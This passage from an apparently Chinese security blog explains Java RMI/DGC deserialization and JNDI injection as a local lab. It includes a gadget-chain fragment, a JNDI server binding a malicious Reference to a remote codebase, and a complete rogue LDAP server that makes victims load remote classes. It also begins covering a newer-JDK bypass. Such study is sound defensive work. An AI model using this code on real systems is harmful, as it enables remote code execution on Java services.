class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; q= LazyMap.decorate(map,transform);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">luokuang</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(q, <span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line"><span class="comment">//        luokuang.toString();</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        Class c=badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,luokuang);</span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当对象调用该方法时就会触发反序列化攻击</p>
<p><img src="https://luokuang1.github.io/images/rmi33.png" width="95%" height="80%"></p>
<p>或者直接通过bind一个恶意的远程对象，在客户端通过lookup来获取时进行反序列化从而触发反序列化攻击</p>
<h3 id="DGC反序列化攻击"><a href="#DGC反序列化攻击" class="headerlink" title="DGC反序列化攻击"></a>DGC反序列化攻击</h3><p>在创建远程服务中系统会默认创建一个DGC，这个的主要功能就是回收机制，但是它的里面就存在和注册中心一样的问题，这里是系统自己创建的回收机制，所以也会存在对应的风险</p>
<p>首先是服务端的回收，里面会创建一个DGCImpl_Skel对象，在调用dispatch方法时就存在反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">        ObjID[] var7;</span><br><span class="line">        <span class="type">long</span> var8;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                VMID var39;</span><br><span class="line">                <span class="type">boolean</span> var40;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var14</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var14.readObject();</span><br><span class="line">                    var8 = var14.readLong();</span><br><span class="line">                    var39 = (VMID)var14.readObject();</span><br><span class="line">                    var40 = var14.readBoolean();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var36);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var37);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                Lease var10;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var13</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var13.readObject();</span><br><span class="line">                    var8 = var13.readLong();</span><br><span class="line">                    var10 = (Lease)var13.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var32);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var33);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Lease</span> <span class="variable">var11</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var12.writeObject(var11);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端也是一样，在DGCImpl_Stub对象里面调用了两个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, VMID var4, <span class="type">boolean</span> var5)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">0</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var7</span> <span class="operator">=</span> var6.getOutputStream();</span><br><span class="line">            var7.writeObject(var1);</span><br><span class="line">            var7.writeLong(var2);</span><br><span class="line">            var7.writeObject(var4);</span><br><span class="line">            var7.writeBoolean(var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var8);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var6);</span><br><span class="line">        <span class="built_in">super</span>.ref.done(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var9;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var10;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var11);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Lease <span class="title function_">dirty</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">            var6.writeObject(var1);</span><br><span class="line">            var6.writeLong(var2);</span><br><span class="line">            var6.writeObject(var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var20);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var5);</span><br><span class="line"></span><br><span class="line">        Lease var24;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var9</span> <span class="operator">=</span> var5.getInputStream();</span><br><span class="line">            var24 = (Lease)var9.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var17);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var18);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.ref.done(var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var24;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var21) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var21;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var22) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var22;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var23);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI注入</title>
    <url>/2025/01/23/JNDI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>推荐链接：<a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a></p>
<h3 id="概念定义"><a href="#概念定义" class="headerlink" title="概念定义"></a>概念定义</h3><p>首先在jndi中常见的有四个协议,一般是将一个命名空间来存储java对象，这里就可能存在一种可能如果通过字符串来解析为一个java对象的话就可能会存在利用的问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LDAP  <span class="comment">//轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</span></span><br><span class="line">RMI   <span class="comment">//JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</span></span><br><span class="line">DNS   <span class="comment">//域名服务</span></span><br><span class="line">CORBA <span class="comment">//公共对象请求代理体系结构</span></span><br></pre></td></tr></table></figure>
<h3 id="JNDI-RMI注入"><a href="#JNDI-RMI注入" class="headerlink" title="JNDI+RMI注入"></a>JNDI+RMI注入</h3><p>在服务器里面部署恶意的的对象，在客户端进行加载的时候就会触发恶意代码，这里就需要先部署好前置的服务器</p>
<p>在jndi里面结合rmi就一共有两种运用方式，在jndi中它需要创建一个上下文，就相当于一个存放的容器，其中的容器的绑定对象形式不一样，它可以像rmi一样直接绑定远程对象就是打原生的rmi反序列化</p>
<p>例子如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>,<span class="keyword">new</span> <span class="title class_">JNDI1Object</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">register</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1089</span>);</span><br><span class="line">        <span class="type">JNDI1Interface</span> <span class="variable">stub</span> <span class="operator">=</span> (JNDI1Interface) register.lookup(<span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line">        System.out.println(stub.aaa());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里调用的是InitialContext的rebind方法，但是跟进就发现其实还是调用了原生的rmi的rebind方法</p>
<p>先是调用到RegistryContext的rebind方法</p>
<p><img src="https://luokuang1.github.io/images/jndi1.png" width="95%" height="80%"></p>
<p>接下来就调用到了RegistryImpl_Stub的rebind方法</p>
<p><img src="https://luokuang1.github.io/images/jndi2.png" width="95%" height="80%"></p>
<p>所以如果通过直接绑定远程对象其实可以和原生rmi一样进行攻击，但是这个其实不算真正的JNDI注入，下面就是通过jndi绑定对象支持绑定引用对象，所以这里就通过绑定一个恶意的引用对象来实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">//Reference reference = new Reference(&quot;rce&quot;, &quot;rce&quot;, &quot;http://127.0.0.1:9000/&quot;);</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:9000/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">lookup</span> <span class="operator">=</span> initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本地通过python起一个http服务，成功执行代码</p>
<p>这里的主要思想就是通过我们创建一个恶意的服务，当目标服务器进行远程调用时就进行触发</p>
<p>下面就去看看具体的执行代码的流程</p>
<p>一路lookup调用，最后到达RegistryContext的lookup调用到decodeObject方法里面，最终走出RegistryContext去到NamingManager里面</p>
<p><img src="https://luokuang1.github.io/images/jndi3.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/jndi4.png" width="95%" height="80%"></p>
<p>这里其实就已经走去了rmi，去往了一个通用的类，一直走到NamingManager的getObjectInstance方法里面，调用getObjectFactoryFromReference来进行类加载</p>
<p><img src="https://luokuang1.github.io/images/jndi5.png" width="95%" height="80%"></p>
<p>所以其实不只是jndi与rmi结合有问题，其它协议也是一样</p>
<h3 id="JNDI-LDAP注入"><a href="#JNDI-LDAP注入" class="headerlink" title="JNDI+LDAP注入"></a>JNDI+LDAP注入</h3><h4 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h4><p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。  LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</p>
<p>也就是说，LDAP <strong>「是一个协议」</strong>，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 <strong>「LDAP 协议的实现」</strong>，有着众多版本，例如微软的  Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP  所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP  协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP  这些程序的服务器。</p>
<p>在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dn ：一条记录的详细位置</span><br><span class="line">dc ：一条记录所属区域    (哪一颗树)</span><br><span class="line">ou ：一条记录所属组织    （哪一个分支）</span><br><span class="line">cn/uid：一条记录的名字/ID   (哪一个苹果名字)</span><br><span class="line">...</span><br><span class="line">LDAP目录树的最顶部就是根，也就是所谓的<span class="string">&quot;基准DN&quot;</span>。</span><br></pre></td></tr></table></figure>
<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>这里主要通过导入依赖来创建环境</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.1</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>创建一个ldap服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI_ldap;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_server</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:9000/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建受害的服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI_ldap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:9999/test&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功执行</p>
<p><img src="https://luokuang1.github.io/images/jndi6.png" width="95%" height="80%"></p>
<h3 id="高版本jdk绕过-tomcat8环境"><a href="#高版本jdk绕过-tomcat8环境" class="headerlink" title="高版本jdk绕过(tomcat8环境)"></a>高版本jdk绕过(tomcat8环境)</h3><h4 id="补丁的形式"><a href="#补丁的形式" class="headerlink" title="补丁的形式"></a>补丁的形式</h4><p>高版本的补丁形式,一般在执行远程的代码时会进行检查，这里主要体现在RegistryContext的decodeObject方法里面，这里会增加一个属性trustURLCodebase来进行判断</p>
<p><img src="https://luokuang1.github.io/images/jndi7.png" width="95%" height="80%"></p>
<p>绕过直接运行就会出现</p>
<p><img src="https://luokuang1.github.io/images/jndi8.png" width="95%" height="80%"></p>
<p>这里可以看到它的默认值为false，如果要远程加载就需要通过手动将它的值进行修改为true</p>
<p><img src="https://luokuang1.github.io/images/jndi9.png" width="95%" height="80%"></p>
